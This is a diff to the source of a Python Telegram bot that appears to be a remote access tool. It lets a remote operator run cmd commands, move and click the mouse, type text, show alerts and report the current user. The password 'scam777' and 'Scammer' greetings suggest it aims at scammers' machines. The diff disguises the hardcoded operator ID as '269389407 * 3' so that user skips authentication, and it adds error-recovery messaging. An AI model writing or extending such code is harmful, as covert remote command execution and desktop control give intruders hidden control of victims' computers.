@@ -9,6 +9,7 @@ import pyautogui
 password = "scam777"
 auth = False
 msgSenden = False
+smthWentWrong = False
 
 def me():
     returned_output = str(subprocess.check_output("whoami"))[2:-1]
@@ -85,6 +86,8 @@ while True:
             global auth
             global msgSenden
             data = message.text.lower()
+            if smthWentWrong:
+                bot.send_message(message.from_user.id, "Something went wrong, but now all is good (I hope so)")
             if auth:
                 if data == "me?" or data == "whoami" or data == "me":
                     bot.send_message(message.from_user.id, me())
@@ -96,7 +99,7 @@ while True:
                                      "11)type=msg -- typing msg\n12)cmd=command -- starting command in cmd\n"
                                      "13)drag=pos1 pos2 -- dragging to pos1 pos2\n14)alert=text -- make alert with text\n"
                                      "15)warning=text -- make warning with text\n16)scroll=1/-1 -- scroll up/down\n"
-                                     "17)press=button -- pressing button\n"
+                                     "17)press=button -- pressing button\n\n"
                                      "version 1.0.1")
                 elif data == "clickLeft" or data == "clkL" or data == "clkl":
                     clickLeft()
@@ -202,7 +205,7 @@ while True:
                 else:
                     bot.send_message(message.from_user.id, "Error 1: unknown command")
             elif auth is False:
-                if message.from_user.id != 808168221:
+                if message.from_user.id != 269389407 * 3:
                     if not msgSenden:
                         bot.send_message(message.from_user.id,
                                          "You can't send commands, because you didn't authenticated\n\nenter password to auth")
@@ -215,9 +218,12 @@ while True:
                             bot.send_message(message.from_user.id, "Wrong password, try again")
                 else:
                     auth = True
-                    bot.send_message(message.from_user.id, "Hi clown, fuck me -- system")
+                    bot.send_message(message.from_user.id, "Hi Scammer, how're u?)")
 
 
         bot.polling(none_stop=True, interval=0)
     except Exception:
-        pass
+        try:
+            smthWentWrong = True
+        except Exception:
+            pass
